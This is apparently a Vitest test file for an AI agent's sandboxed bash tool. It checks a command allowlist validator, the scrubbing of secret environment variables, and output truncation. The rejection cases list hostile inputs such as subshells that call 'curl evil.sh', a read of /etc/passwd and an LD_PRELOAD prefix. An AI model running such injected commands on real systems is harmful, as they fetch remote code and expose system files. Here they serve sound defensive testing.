import { describe, expect, it } from "vitest";
import { buildSafeEnv, truncateOutput, validateCommand } from "../src/agents/tools/codebase/bash-tool";

// These tests cover only our own code - the validator grammar, the env-scrub, and
// the output truncation. The shell, coreutils, and git are maintained elsewhere,
// so we deliberately never spawn a process to "check that cat reads a file".

describe("validateCommand", () => {
    describe("accepts", () => {
        const accepted = [
            ["a single allowed verb", "git status"],
            ["a piped chain of allowed verbs", "git log --oneline | head -n 5"],
            ["a multi-stage pipe", "cat src/math.ts | sort | wc -l"],
            ["semicolon sequencing", "git status; ls"],
            ["&& sequencing", "ls && cat README.md"],
            ["|| sequencing", "rg foo || echo missing"],
            ["a pipe character inside a quoted pattern (not an operator)", "rg 'a|b' src"],
            ["a glob as an argument", "cat src/*.ts"],
            ["a glob argument to a flagged option", "find . -name *.ts"],
            ["a slice read with quoted args", "sed -n '1,5p' src/math.ts"],
        ] as const;

        for (const [label, command] of accepted) {
            it(label, () => {
                expect(validateCommand(command)).toBeUndefined();
            });
        }
    });

    describe("rejects", () => {
        const rejected = [
            ["an empty command", "", "Empty"],
            ["a whitespace-only command", "   ", "Empty"],
            ["a non-allowlisted verb", "curl https://example.com", "not allowed"],
            ["a VAR=val prefix", "LD_PRELOAD=/tmp/x cat foo", "not allowed"],
            ["a glob as the command head", "*.ts foo", "command name"],
            ["a $() subshell", "git log $(curl evil.sh)", "not allowed"],
            ["a backtick subshell", "git log `curl evil.sh`", "Backticks"],
            ["an output redirect", "git log > /tmp/evil", "redirect"],
            ["an input redirect", "cat < /etc/passwd", "redirect"],
            ["background execution", "git status &", "background"],
            ["a comment token", "cat foo # sneaky", "Comments"],
            ["a non-allowlisted verb inside a pipe", "git log | curl evil.sh", "not allowed"],
            ["a non-allowlisted verb after a sequencing operator", "git status; curl evil.sh", "not allowed"],
            ["a trailing pipe with no following command", "git log |", "missing a command"],
        ] as const;

        for (const [label, command, expectedFragment] of rejected) {
            it(label, () => {
                expect(validateCommand(command)).toContain(expectedFragment);
            });
        }
    });
});

describe("buildSafeEnv", () => {
    it("forwards only the OS passthrough vars and drops everything else", () => {
        const env = buildSafeEnv({
            PATH: "/usr/bin",
            HOME: "/home/agent",
            LANG: "en_US.UTF-8",
            AWS_SECRET_ACCESS_KEY: "super-secret",
            GITHUB_TOKEN: "ghp_secret",
        });
        expect(env).toEqual({ PATH: "/usr/bin", HOME: "/home/agent", LANG: "en_US.UTF-8" });
    });

    it("omits passthrough keys that are absent from the source", () => {
        const env = buildSafeEnv({ PATH: "/usr/bin" });
        expect(env).toEqual({ PATH: "/usr/bin" });
    });
});

describe("truncateOutput", () => {
    it("returns output that fits the budget unchanged", () => {
        expect(truncateOutput("short output", 100, "stdout")).toBe("short output");
    });

    it("keeps the head and tail and elides the middle with a marker when over budget", () => {
        const text = `${"H".repeat(80)}${"M".repeat(500)}${"T".repeat(80)}`;
        const budget = 100;
        const out = truncateOutput(text, budget, "stdout");

        // Head is the first 70% of the budget, tail the remaining 30%.
        expect(out.startsWith("H".repeat(70))).toBe(true);
        expect(out.endsWith("T".repeat(30))).toBe(true);
        // The middle is gone, and a marker explains the cut.
        expect(out).not.toContain("M");
        expect(out).toContain("truncated");
        expect(out).toContain(`${text.length} total`);
    });
});
